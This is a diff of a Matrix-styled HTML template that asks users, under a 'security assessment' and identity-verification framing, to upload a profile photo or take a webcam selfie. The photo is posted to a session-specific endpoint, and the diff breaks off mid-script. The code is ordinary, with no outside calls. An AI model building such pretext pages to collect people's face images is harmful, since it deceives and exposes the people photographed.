@@ -1,164 +1,640 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Add Profile Picture</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
+        :root {
+            --primary-color: #0f0;
+            --primary-glow: rgba(0, 255, 0, 0.7);
+            --bg-color: #0a0a0a;
+            --container-bg: rgba(17, 17, 17, 0.95);
+            --border-color: #0f0;
+            --secondary-color: #00cc00;
+            --accent-color: #00ff9d;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
         body {
             font-family: 'Courier New', monospace;
-            background-color: #0a0a0a;
-            color: #0f0;
+            background-color: var(--bg-color);
+            color: var(--primary-color);
             margin: 0;
             padding: 20px;
             text-align: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-image: 
+                radial-gradient(circle at 50% 50%, rgba(0, 255, 0, 0.05) 0%, transparent 50%),
+                linear-gradient(to bottom, rgba(0, 0, 0, 0.95) 0%, rgba(0, 20, 0, 0.9) 100%);
+            background-attachment: fixed;
         }
+        
         .container {
             max-width: 800px;
+            width: 90%;
             margin: 0 auto;
-            padding: 20px;
-            border: 1px solid #0f0;
-            border-radius: 5px;
-            background-color: #111;
+            padding: 30px;
+            border: 2px solid var(--border-color);
+            border-radius: 15px;
+            background-color: var(--container-bg);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2), inset 0 0 20px rgba(0, 255, 0, 0.05);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
         }
-        h1 {
-            color: #0f0;
-            text-shadow: 0 0 5px #0f0;
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(
+                transparent, 
+                transparent, 
+                transparent, 
+                var(--primary-color)
+            );
+            animation: rotate 4s linear infinite;
+            z-index: -1;
         }
+        
+        .container::after {
+            content: '';
+            position: absolute;
+            inset: 3px;
+            background: var(--container-bg);
+            border-radius: 12px;
+            z-index: -1;
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        h1, h2 {
+            color: var(--primary-color);
+            text-shadow: 0 0 10px var(--primary-glow);
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        h1::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 10%;
+            width: 80%;
+            height: 2px;
+            background: var(--primary-color);
+            box-shadow: 0 0 10px var(--primary-glow);
+        }
+        
+        p {
+            margin: 15px 0;
+            line-height: 1.6;
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
+        }
+        
         button {
-            background-color: #0a0a0a;
-            color: #0f0;
-            border: 1px solid #0f0;
-            padding: 10px 20px;
+            background-color: transparent;
+            color: var(--primary-color);
+            border: 2px solid var(--primary-color);
+            border-radius: 50px;
+            padding: 12px 25px;
             font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            margin: 10px;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            z-index: 1;
+        }
+        
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.2), transparent);
+            transition: all 0.4s ease;
+            z-index: -1;
+        }
+        
+        button:hover::before, button:focus::before {
+            left: 100%;
+        }
+        
+        button:hover, button:focus {
+            background-color: rgba(0, 255, 0, 0.1);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+            transform: translateY(-3px);
+            outline: none;
+        }
+        
+        button:active {
+            transform: translateY(1px);
+            box-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+        }
+        
+        /* Circle profile picture styles */
+        .profile-circle-container {
+            position: relative;
+            width: 220px;
+            height: 220px;
+            margin: 30px auto;
+            border-radius: 50%;
+            padding: 8px;
+            background: linear-gradient(145deg, rgba(0, 255, 0, 0.8), rgba(0, 200, 0, 0.5));
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .profile-circle {
+            position: relative;
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            overflow: hidden;
+            background-color: #111;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 2px solid rgba(0, 255, 0, 0.3);
+        }
+        
+        .profile-circle .placeholder {
+            font-size: 60px;
+            color: rgba(0, 255, 0, 0.5);
+        }
+        
+        .preview {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: center;
+            border-radius: 50%;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .file-input-wrapper {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
             margin: 10px;
         }
-        button:hover {
-            background-color: #0f0;
-            color: #000;
-            box-shadow: 0 0 10px #0f0;
+        
+        .file-input-label {
+            background-color: transparent;
+            color: var(--primary-color);
+            border: 2px solid var(--primary-color);
+            border-radius: 50px;
+            padding: 12px 25px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: inline-block;
         }
-        .preview {
-            max-width: 200px;
-            max-height: 200px;
+        
+        .file-input-label:hover {
+            background-color: rgba(0, 255, 0, 0.1);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+            transform: translateY(-3px);
+        }
+        
+        /* Camera section */
+        #camera-section {
+            transition: all 0.5s ease;
+        }
+        
+        .camera-container {
+            position: relative;
+            width: 320px;
+            height: 320px;
             margin: 20px auto;
-            border: 1px solid #0f0;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid var(--primary-color);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
         }
-        .hidden {
-            display: none;
+        
+        #video, #photo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: center;
+        }
+        
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            box-shadow: inset 0 0 50px rgba(0, 255, 0, 0.3);
+            pointer-events: none;
+        }
+        
+        .camera-controls {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .section-transition {
+            transition: all 0.5s ease-in-out;
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .section-transition.hidden {
+            opacity: 0;
+            transform: translateY(20px);
+        }
+        
+        /* Upload progress */
+        .upload-progress {
+            width: 100%;
+            height: 4px;
+            background-color: rgba(0, 255, 0, 0.1);
+            margin: 15px 0;
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+            transition: width 0.5s ease;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: var(--primary-color);
+            opacity: 0.7;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: var(--primary-color);
+            margin: 0 10px;
+        }
+        
+        /* Capture button with special style */
+        .capture-btn {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-color: transparent;
+            border: 2px solid var(--primary-color);
+            color: var(--primary-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 15px auto;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            padding: 0;
+            position: relative;
+        }
+        
+        .capture-btn::before {
+            content: '';
+            position: absolute;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background-color: rgba(0, 255, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+        
+        .capture-btn:hover::before {
+            transform: scale(0.9);
+            background-color: rgba(0, 255, 0, 0.4);
+        }
+        
+        .capture-btn:active::before {
+            transform: scale(0.8);
+            background-color: rgba(0, 255, 0, 0.6);
+        }
+        
+        /* Pulse animation for capture button */
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(0, 255, 0, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(0, 255, 0, 0);
+            }
+        }
+        
+        /* Add Matrix background */
+        .matrix-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            opacity: 0.15;
+        }
+        
+        /* Toast notifications */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: var(--primary-color);
+            padding: 12px 25px;
+            border-radius: 50px;
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            font-size: 14px;
+        }
+        
+        .toast.show {
+            opacity: 1;
+        }
+        
+        /* Responsive styles */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px 15px;
+                width: 95%;
+            }
+            
+            .profile-circle-container {
+                width: 180px;
+                height: 180px;
+            }
+            
+            .profile-circle {
+                width: 160px;
+                height: 160px;
+            }
+            
+            .camera-container {
+                width: 250px;
+                height: 250px;
+            }
+            
+            button {
+                padding: 10px 20px;
+                font-size: 12px;
+                width: 100%;
+                max-width: 200px;
+            }
+            
+            .camera-controls {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+        
+        /* Loading indicator */
+        .loading-indicator {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 20px auto;
+        }
+        
+        .loading-indicator div {
+            position: absolute;
+            border: 4px solid var(--primary-color);
+            opacity: 1;
+            border-radius: 50%;
+            animation: loading-indicator 1s cubic-bezier(0, 0.2, 0.8, 1) infinite;
+        }
+        
+        .loading-indicator div:nth-child(2) {
+            animation-delay: -0.5s;
+        }
+        
+        @keyframes loading-indicator {
+            0% {
+                top: 36px;
+                left: 36px;
+                width: 0;
+                height: 0;
+                opacity: 0;
+            }
+            4.9% {
+                top: 36px;
+                left: 36px;
+                width: 0;
+                height: 0;
+                opacity: 0;
+            }
+            5% {
+                top: 36px;
+                left: 36px;
+                width: 0;
+                height: 0;
+                opacity: 1;
+            }
+            100% {
+                top: 0px;
+                left: 0px;
+                width: 72px;
+                height: 72px;
+                opacity: 0;
+            }
         }
     </style>
 </head>
 <body>
+    <canvas id="matrixCanvas" class="matrix-background"></canvas>
+    
     <div class="container">
         <h1>SECURITY PROFILE SETUP</h1>
         <p>To complete your security assessment, we need to verify your identity.</p>
         
-        <div id="upload-section">
+        <div id="upload-section" class="section-transition">
+            <div class="profile-circle-container">
+                <div class="profile-circle">
+                    <i class="fa-solid fa-user placeholder" id="placeholder-icon"></i>
+                    <img id="preview" class="preview hidden" alt="Profile Preview">
+                </div>
+            </div>
+            
             <h2>Upload Profile Picture</h2>
-            <form method="post" action="/upload_picture/{{ session_id }}" enctype="multipart/form-data">
-                <input type="file" name="file" id="file" accept="image/*" style="display: none;">
-                <button type="button" onclick="document.getElementById('file').click()">SELECT FILE</button>
-                <img id="preview" class="preview hidden">
+            <form method="post" action="/upload_picture/{{ session_id }}" enctype="multipart/form-data" id="upload-form">
+                <input type="file" name="file" id="file" accept="image/*" class="hidden">
+                <div class="file-input-wrapper">
+                    <button type="button" onclick="document.getElementById('file').click()" class="file-input-label">
+                        <i class="fa-solid fa-upload"></i> SELECT FILE
+                    </button>
+                </div>
+                
+                <div class="upload-progress hidden" id="upload-progress">
+                    <div class="progress-bar" id="progress-bar"></div>
+                </div>
+                
                 <div>
-                    <button type="submit">UPLOAD</button>
+                    <button type="submit" id="upload-button" disabled>
+                        <i class="fa-solid fa-cloud-arrow-up"></i> UPLOAD
+                    </button>
                 </div>
             </form>
-            <p>OR</p>
-            <button onclick="showCamera()">USE CAMERA</button>
+            
+            <div class="divider">OR</div>
+            
+            <button onclick="showCamera()" id="camera-button">
+                <i class="fa-solid fa-camera"></i> USE CAMERA
+            </button>
         </div>
         
-        <div id="camera-section" class="hidden">
+        <div id="camera-section" class="hidden section-transition">
             <h2>Take a Selfie</h2>
-            <video id="video" width="320" height="240" autoplay></video>
-            <canvas id="canvas" width="320" height="240" class="hidden"></canvas>
-            <div>
-                <button onclick="takeSnapshot()">CAPTURE</button>
-                <button onclick="showUpload()">BACK</button>
+            <div class="camera-container">
+                <video id="video" autoplay playsinline></video>
+                <canvas id="canvas" class="hidden"></canvas>
+                <img id="photo" class="hidden" alt="Captured Photo">
+                <div class="camera-overlay"></div>
             </div>
+            
+            <div class="camera-controls">
+                <button onclick="takeSnapshot()" class="capture-btn pulse" id="capture-btn">
+                    <i class="fa-solid fa-camera"></i>
+                </button>
+            </div>
+            
+            <div>
+                <button onclick="showUpload()" id="back-button">
+                    <i class="fa-solid fa-arrow-left"></i> BACK
+                </button>
+            </div>
+            
             <form id="camera-form" method="post" action="/upload_camera/{{ session_id }}" class="hidden">
                 <input type="hidden" name="image_data" id="image-data">
-                <button type="submit">SUBMIT SELFIE</button>
+                <button type="submit" id="submit-selfie-button">
+                    <i class="fa-solid fa-check"></i> SUBMIT SELFIE
+                </button>
             </form>
-            <img id="photo" class="preview hidden">
+        </div>
+        
+        <div id="loading" class="hidden section-transition">
+            <div class="loading-indicator"><div></div><div></div></div>
+            <p>Processing your image...</p>
         </div>
     </div>
+    
+    <div id="toast" class="toast"></div>
 
     <script>
+        // Matrix background effect
+        function setupMatrixBackground() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const characters = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*()_+{}:"<>?[]\\|';
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            
+            const drops = [];
+            for (let i = 0; i < columns; i++) {
+                drops[i] = Math.floor(Math.random() * -canvas.height/fontSize);
+            }
+            
+            function draw() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#0f0';
+                ctx.font = fontSize + 'px monospace';
+                
+                for (let i = 0; i < drops.length; i++) {
+                    const text = characters.charAt(Math.floor(Math.random() * characters.length));
+                    
+                    // Adjust opacity based on position to create a fading effect
+                    const opacity = Math.min(1, Math.random() + 0.5);
+                    ctx.fillStyle = `rgba(0, 255, 0, ${opacity})`;
+                    
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(draw, 33);
+            
+            window.addEventListener('resize', () => {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+        }
+        
+        // Initialize matrix background
+        setupMatrixBackground();
+        
+        // Camera functions
         function showCamera() {
             document.getElementById('upload-section').classList.add('hidden');
-            document.getElementById('camera-section').classList.remove('hidden');
-            initCamera();
-        }
-        
-        function showUpload() {
-            document.getElementById('camera-section').classList.add('hidden');
-            document.getElementById('upload-section').classList.remove('hidden');
-            stopCamera();
-        }
-        
-        function initCamera() {
-            const video = document.getElementById('video');
-            
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        video.srcObject = stream;
-                    })
-                    .catch(error => {
-                        alert("Could not access the camera: " + error);
-                        showUpload();
-                    });
-            } else {
-                alert("Camera access not supported by your browser");
-                showUpload();
-            }
-        }
-        
-        function stopCamera() {
-            const video = document.getElementById('video');
-            const stream = video.srcObject;
-            if (stream) {
-                const tracks = stream.getTracks();
-                tracks.forEach(track => track.stop());
-                video.srcObject = null;
-            }
-        }
-        
-        function takeSnapshot() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const photo = document.getElementById('photo');
-            const imageData = document.getElementById('image-data');
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const image = canvas.toDataURL('image/jpeg');
-            photo.src = image;
-            photo.classList.remove('hidden');
-            imageData.value = image;
-            
-            document.getElementById('camera-form').classList.remove('hidden');
-        }
-        
-        // File upload preview
-        document.getElementById('file').addEventListener('change', function(e) {
-            const preview = document.getElementById('preview');
-            const file = e.target.files[0];
-            
-            if (file) {
-                const reader = new FileReader();
-                
-                reader.onload = function(event) {
-                    preview.src = event.target.result;
-                    preview.classList.remove('hidden');
-                }
-                
-                reader.readAsDataURL(file);
-            }
-        });
-    </script>
-</body>
-</html>
+            set
